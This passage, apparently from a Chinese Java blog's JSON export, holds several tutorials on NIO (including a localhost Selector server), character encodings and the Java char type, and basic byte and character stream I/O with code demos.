模式（Asynchronous I/O）Java SE 7 版本之后，引入了异步 I/O （NIO.2） 的支持，为构建高性能的网络应用提供了一个利器。 http://tutorials.jenkov.com/java-nio/nio-vs-io.html https://examples.javacodegeeks.com/core-java/nio/java-nio-asynchronous-channels-tutorial/ Netty - JDK原生NIO程序的问题JDK原生也有一套网络应用程序API，但是存在一系列问题，主要如下： NIO的类库和API繁杂，使用麻烦，你需要熟练掌握Selector、ServerSocketChannel、SocketChannel、ByteBuffer等 需要具备其它的额外技能做铺垫，例如熟悉Java多线程编程，因为NIO编程涉及到Reactor模式，你必须对多线程和网路编程非常熟悉，才能编写出高质量的NIO程序 可靠性能力补齐，开发工作量和难度都非常大。例如客户端面临断连重连、网络闪断、半包读写、失败缓存、网络拥塞和异常码流的处理等等，NIO编程的特点是功能开发相对容易，但是可靠性能力补齐工作量和难度都非常大 Reference Java I/O 模型的演进 - https://waylau.com/java-io-model-evolution/ Java进阶（五）Java I/O模型从BIO到NIO和Reactor模式 - http://www.jasongj.com/java/nio_reactor/s Scalable IO in Java - http://gee.cs.oswego.edu/dl/cpjslides/nio.pdf Java NIO：浅析I/O模型 - https://www.cnblogs.com/dolphin0520/p/3916526.html 高性能网络编程(六)：一文读懂高性能网络编程中的线程模型 - http://www.52im.net/thread-1939-1-1.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"},{"name":"NetworkProgramming","slug":"Java/NetworkProgramming","permalink":"http://swsmile.info/categories/Java/NetworkProgramming/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"},{"name":"Network Programming","slug":"Network-Programming","permalink":"http://swsmile.info/tags/Network-Programming/"}]},{"title":"【Java】I/O - NIO 使用","date":"2019-03-04T04:46:49.000Z","path":"2019/03/04/【Java】IO-NIO-使用/","text":"读取文件 123456789// 第一步是获取通道。我们从 FileInputStream 获取通道：FileInputStream fin = new FileInputStream( \"readandshow.txt\" );FileChannel fc = fin.getChannel();// 下一步是创建缓冲区：ByteBuffer buffer = ByteBuffer.allocate( 1024 );// 最后，需要将数据从通道读到缓冲区中，如下所示：fc.read( buffer ); 写入文件1234567891011121314// 首先从 FileOutputStream 获取一个通道：FileOutputStream fout = new FileOutputStream( \"writesomebytes.txt\" );FileChannel fc = fout.getChannel();// 创建一个缓冲区并在其中放入一些数据 - 在这里，数据将从一个名为 message 的数组中取出ByteBuffer buffer = ByteBuffer.allocate( 1024 ); for (int i=0; i&lt;message.length; ++i) &#123; buffer.put( message[i] );&#125;buffer.flip();// 最后一步是写入缓冲区中：fc.write( buffer ); 服务端12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.SelectionKey;import java.nio.channels.Selector;import java.nio.channels.ServerSocketChannel;import java.nio.channels.SocketChannel;import java.util.Iterator;import java.util.Set;public class EpollServer &#123; public static void main(String[] args) &#123; try &#123; ServerSocketChannel ssc = ServerSocketChannel.open(); ssc.socket().bind(new InetSocketAddress(\"127.0.0.1\", 8000)); ssc.configureBlocking(false); Selector selector = Selector.open(); // 注册 channel，并且指定感兴趣的事件是 Accept ssc.register(selector, SelectionKey.OP_ACCEPT); ByteBuffer readBuff = ByteBuffer.allocate(1024); ByteBuffer writeBuff = ByteBuffer.allocate(128); writeBuff.put(\"received\".getBytes()); writeBuff.flip(); while (true) &#123; int nReady = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; it = keys.iterator(); while (it.hasNext()) &#123; SelectionKey key = it.next(); it.remove(); if (key.isAcceptable()) &#123; // 创建新的连接，并且把连接注册到selector上，而且， // 声明这个channel只对读操作感兴趣。 SocketChannel socketChannel = ssc.accept(); socketChannel.configureBlocking(false); socketChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel socketChannel = (SocketChannel) key.channel(); readBuff.clear(); socketChannel.read(readBuff); readBuff.flip(); System.out.println(\"received : \" + new String(readBuff.array())); key.interestOps(SelectionKey.OP_WRITE); &#125; else if (key.isWritable()) &#123; writeBuff.rewind(); SocketChannel socketChannel = (SocketChannel) key.channel(); socketChannel.write(writeBuff); key.interestOps(SelectionKey.OP_READ); &#125; &#125; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; Reference NIO 入门 - https://www.ibm.com/developerworks/cn/education/java/j-nio/j-nio.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】字符（char）","date":"2019-03-03T04:19:43.000Z","path":"2019/03/03/【Java】字符-字符（char）/","text":"背景究竟什么是字符？众所周知，一个字符（character）就是一个字（(letter），一串字母组成一个单词，一组单词组成句子，以此类推。然而，事实上，在计算机中，在屏幕上描述的字符（被称为字符的图符），和为这个字符指定的数值（被称为代码值），并不是直接对应的。 在 ASCII 中，定义了96个可印刷的字符，就可以用来书写英语。这与定义了2万多个图符还不足以表述其所有文字的中文相比，简直是天差地别。从早期的摩尔斯码和波多码开始，英语整体的简单性（较少的图符，按统计频率出现）就使其成为了数字化时代的一门通用语言。但是随着更多的人进入到数字化时代，随着非英语国家更多地使用计算机，越来越多的人们遂渐不能容忍计算机只能用ASCII码和只能表述英语。这极大地增加了计算机能够理解的“字符”的数量。由此，人们意识到，计算机所用的字符编码位数必须翻倍。 当受人尊敬的7位ASCII码被合并成为8位的被称为ISOlatin-1（或ISO8859_1），ISO表示国际标准化组织)字符编码之后，可利用的字符数量翻了一倍。正如你可能从这一编码的名字中想到的一样，这个标准保证了在计算机上，许多的欧洲国家可以描述它们的语言。然而，仅仅是标准的确立，还不能意味着标准的利用。那时，许多的计算机产商为了某些利益，已经开始利用了8位字符中的其它128个“字符”。目前还能看到的利用这些额外字符的例子有IBM的个人计算机(PC)，和曾一度最为流行的计算机终端，DEC公司的VT-100。后者在终端仿真软件上继续存在。 究竟何时停止八位字符的使用，这一问题将会在以后的数十年内一直争论下去，但是何时提出这一问题却可以做出回答。我认为，从1984年引入Macintosh计算机时起，这一问题就已开始提出。Macintosh为主流计算机引入了两个革命性的概念：存储于RAM中的字符字体；和可以描述所有语言所用字符的世界文字体系(WorldScript)。当然，这其实也只是Xerox公司所做所为的一个翻版，在它的蒲公英(Dandelion)系列机器上，就以Star字处理系统的形式，利用了这些技术。然而，是Macintosh把这些新的字符集和字体带给了还在利用“哑”终端的用户。一旦有人开了头，利用不同字体的做法就无法被终断──因为许许多多的人们对其爱不释手。到80年代后期，为了合理而标准地使用这些字符，一个名为Unicode协会(UnicodeConsortium)的组织应运而生，并于1990年，发布了它的第一个Unicode规范。然而不幸的是，在80年代甚至在进入90年代之后，字符集的数量在成倍的增长，在那时，几乎正在从事新字符编码的所有工程师，都认为刚刚上步的Unicode标准不会长久，因而，他们为各种文字，创建了与他人各不相同的编码。然而，即使是在Unicode不被广泛采纳的情况下，那种认为只有128个或最多256个字符能被采用的观念已不复存在。在Macintosh之后，对不同字体的支持已成为字处理系统中不可缺少的功能。八位字符正在消褪，遂渐消亡。 如何“翻译”明白了各种语言需要交流，经过翻译是必要的，那又如何来翻译呢？计算中提拱了多种翻译方式，常见的有 ASCII、ISO-8859-1、GB2312、GBK、UTF-8、UTF-16 等。它们都可以被看作为字典，它们规定了转化的规则，按照这个规则就可以让计算机正确的表示我们的字符。目前的编码格式很多，例如 GB2312、GBK、UTF-8、UTF-16 这几种格式都可以表示一个汉字，那我们到底选择哪种编码格式来存储汉字呢？这就要考虑到其它因素了，是存储空间重要还是编码的效率重要。根据这些因素来正确选择编码格式，下面简要介绍一下这几种编码格式。 ASCII 码 学过计算机的人都知道 ASCII 码，总共有 128 个，用一个字节的低 7 位表示，031 是控制字符如换行回车删除等；32126 是打印字符，可以通过键盘输入并且能够显示出来。 ISO-8859-1 128 个字符显然是不够用的，于是 ISO 组织在 ASCII 码基础上又制定了一些列标准用来扩展 ASCII 编码，它们是 ISO-8859-1~ISO-8859-15，其中 ISO-8859-1 涵盖了大多数西欧语言字符，所有应用的最广泛。ISO-8859-1 仍然是单字节编码，它总共能表示 256 个字符。 GB2312 它的全称是《信息交换用汉字编码字符集 基本集》，它是双字节编码，总的编码范围是 A1-F7，其中从 A1-A9 是符号区，总共包含 682 个符号，从 B0-F7 是汉字区，包含 6763 个汉字。 GBK 全称叫《汉字内码扩展规范》，是国家技术监督局为 wWndows95 所制定的新的汉字内码规范，它的出现是为了扩展 GB2312，加入更多的汉字，它的编码范围是 8140~FEFE（去掉 XX7F）总共有 23940 个码位，它能表示 21003 个汉字，它的编码是和 GB2312 兼容的，也就是说用 GB2312 编码的汉字可以用 GBK 来解码，并且不会有乱码。 GB18030 全称是《信息交换用汉字编码字符集》，是我国的强制标准，它可能是单字节、双字节或者四字节编码，它的编码与 GB2312 编码兼容，这个虽然是国家标准，但是实际应用系统中使用的并不广泛。 UTF-16 说到 UTF 必须要提到 Unicode（Universal Code 统一码），ISO 试图想创建一个全新的超语言字典，世界上所有的语言都可以通过这本字典来相互翻译。可想而知这个字典是多么的复杂，关于 Unicode 的详细规范可以参考相应文档。Unicode 是 Java 和 XML 的基础，下面详细介绍 Unicode 在计算机中的存储形式。 UTF-16 具体定义了 Unicode 字符在计算机中存取方法。UTF-16 用两个字节来表示 Unicode 转化格式，这个是定长的表示方法，不论什么字符都可以用两个字节表示，两个字节是 16 个 bit，所以叫 UTF-16。UTF-16 表示字符非常方便，每两个字节表示一个字符，这个在字符串操作时就大大简化了操作，这也是 Java 以 UTF-16 作为内存的字符存储格式的一个很重要的原因。 UTF-8 UTF-16 统一采用两个字节表示一个字符，虽然在表示上非常简单方便，但是也有其缺点，有很大一部分字符用一个字节就可以表示的现在要两个字节表示，存储空间放大了一倍，在现在的网络带宽还非常有限的今天，这样会增大网络传输的流量，而且也没必要。而 UTF-8 采用了一种变长技术，每个编码区域有不同的字码长度。不同类型的字符可以是由 1~6 个字节组成。 UTF-8 有以下编码规则： 如果一个字节，最高位（第 8 位）为 0，表示这是一个 ASCII 字符（00 - 7F）。可见，所有 ASCII 编码已经是 UTF-8 了。 如果一个字节，以 11 开头，连续的 1 的个数暗示这个字符的字节数，例如：110xxxxx 代表它是双字节 UTF-8 字符的首字节。 如果一个字节，以 10 开始，表示它不是首字节，需要向前查找才能得到当前字符的首字节 char 的学习由于 Java 采用的是 16 位的 Unicode 字符集，即 UTF-16，所以在 Java 中 char 数据类型是定长的，其长度永远只有 16 位（2个字节），这里的定长是与 UTF-8 进行区别的，因为 UTF-8 使用变长机制来表示字符。 char 数据类型永远只能表示代码点在 U+0000 ~ U+FFFF 之间的字符： 最小值是 \\u0000（即为0）； 最大值是 \\uffff（即为65,535）； 如果代码点超过了这个范围，即使用了增补字符，那么 char 数据类型将无法支持，因为增补字符需要 32 位的长度来存储，我们只能转而使用 String 来存储这个字符。 Java 中使用 UnicodeJava 中使用 Unicode 的原因是，Java 的 Applet 允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。 而当只表示 English，Spanish，German 或 French等语言时，根本不需要 2 个字节的长度这么长来表示，所以这时其实采用ASCII码会更高效。 因此，是采用 Unicode 还是 ASCII 来编码一个字符就存在一个权衡问题，即是获得更全的字符表达范围，还是使用更少的存储空间。 字符常量有三种表示形式单个字符直接通过单个字符来指定字符常量：例如，’A’、’a’、’8’、“中”等。 12345//直接指定单个字符的字符常量char aChar = &apos;a&apos;;//指定一个中字符常量char zhong = &apos;中&apos;; 转义字符通过转义字符表示特殊的字符常量：例如：’\\n’、’\\t’等。 有反斜杠（\\）在前的字符是一个转义序列并且对于编译器有特殊的意义。 换行符(\\n)在 System.out.println() 语句中经常使用，在字符串打印出来后换行。 以下的表格展示了 Java 转义序列： 转义序列 描述 \\t 在文本中插入一个标签。 \\b 在文本中插入一个退格。 \\n 在文本中插入一个换行符。 \\r 在文本中插入一个回车。 \\f 在文本中插入一个换页。 &#39; 在文本中插入一个单引号字符。 \\ 在文本中插入一个反斜杠字符。 Unicode 值直接使用 Unicode 值来表示字符常量。即使用一个十进制数，八进制数或十六进制数的整数来表示一个字符的 Unicode 值。 \\u 在 Java 中表示这是一个十六进制数。 当用一个十六进制整数赋值给 一个 char 时，格式是 ‘\\uXXXX’，其中XXXX代表一个十六进制的整数，范围是:’\\u0000’—-‘\\uFFFF’，一共可以表示65536个字符，其中前256个字符（’\\u0000’—‘\\u00FF’）和ASCII码中的字符完全重合。 12345678910111213//使用十六进制的字符的Unicode编码值来赋值char ch1 = '\\u9999';int zhongValue = zhong;//用一个表示十进制数整数来表示Unicode编码值以赋值char ch2 = (char) zhongValue;//将会打印出“中”System.out.println(ch2);// “中”的 Unicode 值为 20013 (十进制)char ch3 = 20013;//将会打印出“中”System.out.println(ch3); Java 中如何编解码Charset 提供 encode 与 decode 分别对应 string 到 byte[] 的编码和 byte[] 到 char[] 的解码。如下代码所示： 123Charset charset = Charset.forName(\"UTF-8\"); ByteBuffer byteBuffer = charset.encode(string); CharBuffer charBuffer = charset.decode(byteBuffer); Reference Java 中 char 和 String 的细节和使用注意 - https://zhuanlan.zhihu.com/p/23654187 深入分析 Java 中的中文编码问题 - https://www.ibm.com/developerworks/cn/java/j-lo-chinesecoding/index.html Java 字符 - https://blog.csdn.net/sunzhenhua0608/article/details/7628663","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】 I/O - I/O 基本操作","date":"2019-03-03T04:13:46.000Z","path":"2019/03/03/【Java】IO-I-O-基本操作/","text":"I/O 简介I/O就是输入和输出，核心是I/O流，流用于读写设备上的数据，包括硬盘文件、键盘、网络…。 I/O 的分类根据数据的走向根据数据的走向分为：输入流（input stream）、输出流（output stream） 根据处理的数据类型根据处理的数据类型分为：字节流（byte stream）、字符流（character stream） 根据数据来源或者说是操作对象从数据来源或者说是操作对象角度看，IO 类可以分为： 文件（file）：FileInputStream、FileOutputStream、FileReader、FileWriter 数组（array）： 字节数组（byte[]）：ByteArrayInputStream、ByteArrayOutputStream 字符数组（char[]）：CharArrayReader、CharArrayWriter 管道操作：PipedInputStream、PipedOutputStream、PipedReader、PipedWriter 基本数据类型：DataInputStream、DataOutputStream 缓冲操作：BufferedInputStream、BufferedOutputStream、BufferedReader、BufferedWriter 打印：PrintStream、PrintWriter 对象序列化反序列化：ObjectInputStream、ObjectOutputStream 转换：InputStreamReader、OutputStreWriter 字节流（byte stream）和字符流（character stream）的区别字节流每次读取 n 个字节，字符流每次读取 n 个字符。 一个字符根据编码的不同，用于表示同一字符的字节数也不同。如 UTF-8 编码是 3 个字节，中文编码是 2 个字节。 字节流能处理所有类型数据，对应的类以 Stream 名称结尾。 字节流用来处理二进制文件（图片、MP3、视频文件），字符流用来处理文本文件（可以看做是特殊的二进制文件，使用了某种编码，人可以阅读）。 字符流只能处理文本数据，对应的类以 Reader 或 Writer 名称结尾。 I/O 类和相关方法在 Java 中，若 I/O 类按字节流和字符流的划分，可以得到下图： I/O 类虽然很多，但最基本的是 4 个抽象类：InputStream、OutputStream、Reader、Writer。最基本的方法也就是一个读 read() 方法、一个写 write() 方法。方法具体的实现还是要看继承这 4 个抽象类的子类，毕竟我们平时使用的也是子类对象。这些类中的一些方法都是（Native）本地方法、所以并没有 Java 源代码， 注意这里的读取和写入，其实就是获取（输入）数据和输出数据。 InputStream 类InputStream 类是表示字节输入流的所有类的超类。 子类 FileInputStream： 从文件系统中的某个文件中获得输入字节。哪些文件可用取决于主机环境。FileInputStream 用于读取诸如图像数据之类的原始字节流。要读取字符流，请考虑使用 FileReader。 BufferedInputStream：该类实现缓冲的输入流。 ByteArrayInputStream: 输入源或输出目标是字节数组的流。 InpurStrem 的基本方法1. read()1public abstract int read() throws IOException; 作用：read从流中读取下一个字节 返回值：int，读取的一个字节，取值0255，即十六进制0x000xFF；当读到流结尾的时候，返回值为-1 工作方式：如果流中没有数据，其阻塞，直到数据到来、流关闭、异常出现 2. read(byte b[])1public int read(byte b[]) throws IOException; 输入：byte[] b，读入的字节将放到数组b中 输出：int，实际读入的字节个数（可以小于数组b的长度）。若刚开始读取已到流结尾，则返回-1 工作方式：将读到字节存到数组b中，一次最多读入的字节个数为数组b的长度；如果流中没有数据，其阻塞，直到数据到来、流关闭、异常出现 3. read(byte b[], int off, int len)1public int read(byte b[], int off, int len) throws IOException; 工作方式：读入的字节存入b[off]，最多读取len个字节 注意，read(byte b[])调用了该方法 123public int read(byte b[]) throws IOException &#123; return read(b, 0, b.length);&#125; 4.close()1public void close() throws IOException 工作方式：流读取结束后，关闭，以释放相关资源。 注意：close一般应该放在finally语句内。 OutputStream 类OutputStream 抽象类是表示输出字节流的所有类的超类。 子类 FileOutputStream：文件输出流是用于将数据写入 File 或 FileDescriptor 的输出流。 BufferedOutputStream：该类实现缓冲的输出流。 ByteArrayOutputSteam：输入源或输出目标是字节数组的流 OutputSteam的基本方法1.write(int b)1public abstract void write(int b) throws IOException; 输入：int b, 表示一个字节，只用int的低8位 工作方式：向流中写入字节b 2.write(byte b[])批量写入的方法： 12public void write(byte b[]) throws IOException;public void write(byte b[], int off, int len) throws IOException 工作方式：向流中写入字节数组b[]，off、len指定开始位置和长度 3.flush()1public void flush() throws IOException 工作方式：flush将缓冲而未实际写的数据进行实际写入 比如，在BufferedOutputStream中，调用flush会将其缓冲区的内容写到其装饰的流中，并调用该流的flush方法。基类OutputStream没有缓冲，flush代码为空。 需要说明的是文件输出流FileOutputStream，你可能会认为，调用flush会强制确保数据保存到硬盘上，但实际上不是这样，FileOutputStream没有缓冲，没有重写flush，调用flush没有任何效果，数据只是传递给了操作系统，但操作系统什么时候保存到硬盘上，这是不一定的。要确保数据保存到了硬盘上，可以调用FileOutputStream中的特有方法。 close() 1public void close() throws IOException 工作方式：close一般会首先调用flush，然后再释放流占用的系统资源。同InputStream一样，close一般应该放在finally语句内。 再来看 Reader 和 Writer 类中的方法，你会发现和上面两个抽象基类中的方法很像。 Reader 类Reader 类用于读取字符流的抽象类，它的子类包括： BufferedReader：从字符输入流中读取文本，缓冲各个字符，从而实现字符、数组和行的高效读取。 可以指定缓冲区的大小，或者可使用默认的大小。大多数情况下，默认值就足够大了。 InputStreamReader：是字节流通向字符流的桥梁：它使用指定的 charset 读取字节并将其解码为字符。它使用的字符集可以由名称指定或显式给定，或者可以接受平台默认的字符集。 FileReader： 用来读取字符文件的便捷类。此类的构造方法假定默认字符编码和默认字节缓冲区大小都是适当的。要自己指定这些值，可以先在 FileInputStream 上构造一个InputStreamReader。 方法 方法介绍 public int read(java.nio.CharBuffer target) 读取字节到字符缓存中 public int read() 读取单个字符 public int read(char cbuf[]) 读取字符到指定的 char 数组中 abstract public int read(char cbuf[], int off, int len) 从 off 位置读取 len 长度的字符到 char 数组中 Writer 类Writer 类是写入字符流的抽象类，其子类包括： BufferedWriter： 将文本写入字符输出流，缓冲各个字符，从而提供单个字符、数组和字符串的高效写入。 OutputStreamWriter ：是字符流通向字节流的桥梁：可使用指定的 charset 将要写入流中的字符编码成字节。它使用的字符集可以由名称指定或显式给定，否则将接受平台默认的字符集。 FileWriter： 用来写入字符文件的便捷类。此类的构造方法假定默认字符编码和默认字节缓冲区大小都是可接受的。要自己指定这些值，可以先在 FileOutputStream 上构造一个 OutputStreamWriter。 方法 方法介绍 public void write(int c) 写入一个字符 public void write(char cbuf[]) 写入一个字符数组 abstract public void write(char cbuf[], int off, int len) 从字符数组的 off 位置写入 len 数量的字符 public void write(String str) 写入一个字符串 public void write(String str, int off, int len) 从字符串的 off 位置写入 len 数量的字符 public Writer append(CharSequence csq) 追加吸入一个字符序列 abstract public void flush() 强制刷新，将缓冲中的数据写入 abstract public void close() 关闭输出流，流被关闭后就不能再输出数据了 规律总结1 明确源和目的。 数据源：就是需要读取，可以使用两个体系：InputStream、Reader； 数据汇：就是需要写入，可以使用两个体系：OutputStream、Writer； 2 操作的数据是否是纯文本数据？ 如果是：数据源：Reader 数据汇：Writer 如果不是：数据源：InputStream 数据汇：OutputStream 3 虽然确定了一个体系，但是该体系中有太多的对象，到底用哪个呢？明确操作的数据设备。 数据源对应的设备：硬盘(File)，内存(数组)，键盘(System.in) 数据汇对应的设备：硬盘(File)，内存(数组)，控制台(System.out)。 使用 Demo读取控制台中的输入1234567891011121314151617181920212223242526import java.io.*;public class Main &#123; public static void main(String[] args) throws IOException &#123; test02(); test03(); &#125; public static void test02() throws IOException &#123; BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in)); System.out.println(\"请输入一个字符，按 q 键结束\"); char c; do &#123; c = (char) bufferedReader.read(); if (c != '\\n') System.out.println(\"你输入的字符为\" + c); &#125; while (c != 'q'); &#125; public static void test03() throws IOException &#123; BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in)); System.out.println(\"请输入一行字符\"); String str = bufferedReader.readLine(); System.out.println(\"你输入的字符为\" + str); &#125;&#125; 输出1234567891011请输入一个字符，按 q 键结束abc你输入的字符为a你输入的字符为b你输入的字符为cq你输入的字符为q请输入一行字符11223你输入的字符为11223 读取二进制文件我们先看一个可以正常工作，但是性能较低的实现： 1234567891011121314151617181920212223242526import java.io.*;public class Main &#123; public static void main(String[] args) throws IOException &#123; InputStream streamReader = null; //文件输入流 ByteArrayOutputStream baos = null; try &#123; streamReader = new FileInputStream(new File(\"aFile\")); baos = new ByteArrayOutputStream(); int value; while ((value = streamReader.read()) != -1) &#123;//读取文件字节，并递增指针到下一个字节 baos.write(value); &#125; baos.flush(); byte[] result = baos.toByteArray(); System.out.println(result); &#125; catch (final IOException e) &#123; //TODO 自动生成的 catch 块 e.printStackTrace(); &#125; finally &#123; streamReader.close(); baos.close(); &#125; &#125;&#125; 分析上面的程序存在问题是，在读取二进制文件内容时，每次只读取一个字节。 如果文件十分庞大，这样的操作会导致较慢的读取速度。 在 Java-二进制文件和字节流 中，作者做了一个实验，即使用不同的 read() 方法来读取同一个文件并计算读取速度： read()，逐个字节读取 78999ms read(byte[] b)，批量字节读取 54ms read(byte b[], int off, int len)，批量字节读取 49ms 由于 read(byte[] b) 本质上也是调用 read(byte b[], int off, int len)，因此它们本质上相同。 结论：尽量不要使用 read() 一个一个字节的读取文件，而要使用将数据读取到缓冲区的方式。 所以，Java 中出现了缓冲区的概念。 Java I/O 默认是不缓冲流的，所谓“缓冲”就是先把从流中得到的一块字节序列暂存在一个被称为 buffer 的内部字节数组里，然后你可以一下子取到这一整块的字节数据，没有缓冲的流只能一个字节一个字节读，效率孰高孰低一目了然。 在上面的例子中，我们可以将 streamReader.read() 改成streamReader.read(byte[] buffer) 。后者方法读取的字节数目等于字节数组的长度，读取的数据被存储在字节数组中，返回读取的字节数。 写入一个新的二进制文件1234567public void test04() throws IOException &#123; byte[] bytes = &#123;12,21,34,11,21&#125;; FileOutputStream fileOutputStream = new FileOutputStream(new File(\"a.txt\")); // 写入二进制文件，直接打开会出现乱码 fileOutputStream.write(bytes); fileOutputStream.close(); &#125; 读取二进制文件并写入一个新的二进制文件我们来看一个引入缓冲区后，读取二进制文件并写入一个新的二进制文件的例子： 1234567891011121314151617181920212223242526272829import java.io.*;public class Main &#123; public static void main(String[] args) throws Exception &#123; String source = \"aFile\"; String destination = \"bFile\"; int bufferSize = 4096; // 设置缓冲区大小 byte buffer[] = new byte[bufferSize]; // 缓冲区字节数组 File sourceFile = new File(source); InputStream fis = new FileInputStream(sourceFile); OutputStream fos = new FileOutputStream(destination); BufferedOutputStream bos = new BufferedOutputStream(fos, bufferSize); int readSize = -1; // 记录每次实际读取字节数 try &#123; while ((readSize = fis.read(buffer)) != -1) &#123; bos.write(buffer, 0, readSize); &#125; bos.flush(); &#125; finally &#123; bos.close(); &#125; System.out.println(\"复制完成\"); &#125;&#125; 写入到文本文件并读取该文件123456789101112131415161718192021222324252627282930313233import java.io.*;public class Main &#123; public static void main(String[] args) throws Exception &#123; String file = \"a.txt\"; String charset = \"UTF-8\"; // 写字符换转成字节流 FileOutputStream outputStream = new FileOutputStream(file); OutputStreamWriter writer = new OutputStreamWriter( outputStream, charset); try &#123; writer.write(\"这是要保存的中文字符\"); &#125; finally &#123; writer.close(); &#125; // 读取字节转换成字符 FileInputStream inputStream = new FileInputStream(file); InputStreamReader reader = new InputStreamReader( inputStream, charset); StringBuffer buffer = new StringBuffer(); char[] buf = new char[64]; int count = 0; try &#123; while ((count = reader.read(buf)) != -1) &#123; buffer.append(buffer, 0, count); &#125; &#125; finally &#123; reader.close(); &#125; &#125;&#125; Reference 看完这个，Java IO从此不在难 - https://juejin.im/post/5b97e5f75188255c8d0fb0c0 Java IO 流之规律总结 - https://juejin.im/entry/5806c4d167f3560058d6ffe3 Java读取二进制文件 - https://www.jianshu.com/p/4715bccb9637 Java-二进制文件和字节流 - https://chaycao.github.io/2017/05/26/Java-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%92%8C%E5%AD%97%E8%8A%82%E6%B5%81/ 看完这个，Java IO从此不在难 - https://juejin.im/post/5b97e5f75188255c8d0fb0c0","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】 字符（串）编码与解码","date":"2019-03-02T03:26:45.000Z","path":"2019/03/02/【Java】字符-字符（串）编码与解码/","text":"背景究竟什么是字符？众所周知，一个字符（character）就是一个字（(letter），一串字母组成一个单词，一组单词组成句子，以此类推。然而，事实上，在计算机中，在屏幕上描述的字符（被称为字符的图符），和为这个字符指定的数值（被称为代码值），并不是直接对应的。 在 ASCII 中，定义了96个可印刷的字符，就可以用来书写英语。这与定义了2万多个图符还不足以表述其所有文字的中文相比，简直是天差地别。从早期的摩尔斯码和波多码开始，英语整体的简单性（较少的图符，按统计频率出现）就使其成为了数字化时代的一门通用语言。但是随着更多的人进入到数字化时代，随着非英语国家更多地使用计算机，越来越多的人们遂渐不能容忍计算机只能用ASCII码和只能表述英语。这极大地增加了计算机能够理解的“字符”的数量。由此，人们意识到，计算机所用的字符编码位数必须翻倍。 当受人尊敬的7位ASCII码被合并成为8位的被称为ISOlatin-1（或ISO8859_1），ISO表示国际标准化组织)字符编码之后，可利用的字符数量翻了一倍。正如你可能从这一编码的名字中想到的一样，这个标准保证了在计算机上，许多的欧洲国家可以描述它们的语言。然而，仅仅是标准的确立，还不能意味着标准的利用。那时，许多的计算机产商为了某些利益，已经开始利用了8位字符中的其它128个“字符”。目前还能看到的利用这些额外字符的例子有IBM的个人计算机(PC)，和曾一度最为流行的计算机终端，DEC公司的VT-100。后者在终端仿真软件上继续存在。 究竟何时停止八位字符的使用，这一问题将会在以后的数十年内一直争论下去，但是何时提出这一问题却可以做出回答。我认为，从1984年引入Macintosh计算机时起，这一问题就已开始提出。Macintosh为主流计算机引入了两个革命性的概念：存储于RAM中的字符字体；和可以描述所有语言所用字符的世界文字体系(WorldScript)。当然，这其实也只是Xerox公司所做所为的一个翻版，在它的蒲公英(Dandelion)系列机器上，就以Star字处理系统的形式，利用了这些技术。然而，是Macintosh把这些新的字符集和字体带给了还在利用“哑”终端的用户。一旦有人开了头，利用不同字体的做法就无法被终断──因为许许多多的人们对其爱不释手。到80年代后期，为了合理而标准地使用这些字符，一个名为Unicode协会(UnicodeConsortium)的组织应运而生，并于1990年，发布了它的第一个Unicode规范。然而不幸的是，在80年代甚至在进入90年代之后，字符集的数量在成倍的增长，在那时，几乎正在从事新字符编码的所有工程师，都认为刚刚上步的Unicode标准不会长久，因而，他们为各种文字，创建了与他人各不相同的编码。然而，即使是在Unicode不被广泛采纳的情况下，那种认为只有128个或最多256个字符能被采用的观念已不复存在。在Macintosh之后，对不同字体的支持已成为字处理系统中不可缺少的功能。八位字符正在消褪，遂渐消亡。 如何“翻译”明白了各种语言需要交流，经过翻译是必要的，那又如何来翻译呢？计算中提拱了多种翻译方式，常见的有 ASCII、ISO-8859-1、GB2312、GBK、UTF-8、UTF-16 等。它们都可以被看作为字典，它们规定了转化的规则，按照这个规则就可以让计算机正确的表示我们的字符。目前的编码格式很多，例如 GB2312、GBK、UTF-8、UTF-16 这几种格式都可以表示一个汉字，那我们到底选择哪种编码格式来存储汉字呢？这就要考虑到其它因素了，是存储空间重要还是编码的效率重要。根据这些因素来正确选择编码格式，下面简要介绍一下这几种编码格式。 ASCII 码 学过计算机的人都知道 ASCII 码，总共有 128 个，用一个字节的低 7 位表示，031 是控制字符如换行回车删除等；32126 是打印字符，可以通过键盘输入并且能够显示出来。 ISO-8859-1 128 个字符显然是不够用的，于是 ISO 组织在 ASCII 码基础上又制定了一些列标准用来扩展 ASCII 编码，它们是 ISO-8859-1~ISO-8859-15，其中 ISO-8859-1 涵盖了大多数西欧语言字符，所有应用的最广泛。ISO-8859-1 仍然是单字节编码，它总共能表示 256 个字符。 GB2312 它的全称是《信息交换用汉字编码字符集 基本集》，它是双字节编码，总的编码范围是 A1-F7，其中从 A1-A9 是符号区，总共包含 682 个符号，从 B0-F7 是汉字区，包含 6763 个汉字。 GBK 全称叫《汉字内码扩展规范》，是国家技术监督局为 wWndows95 所制定的新的汉字内码规范，它的出现是为了扩展 GB2312，加入更多的汉字，它的编码范围是 8140~FEFE（去掉 XX7F）总共有 23940 个码位，它能表示 21003 个汉字，它的编码是和 GB2312 兼容的，也就是说用 GB2312 编码的汉字可以用 GBK 来解码，并且不会有乱码。 GB18030 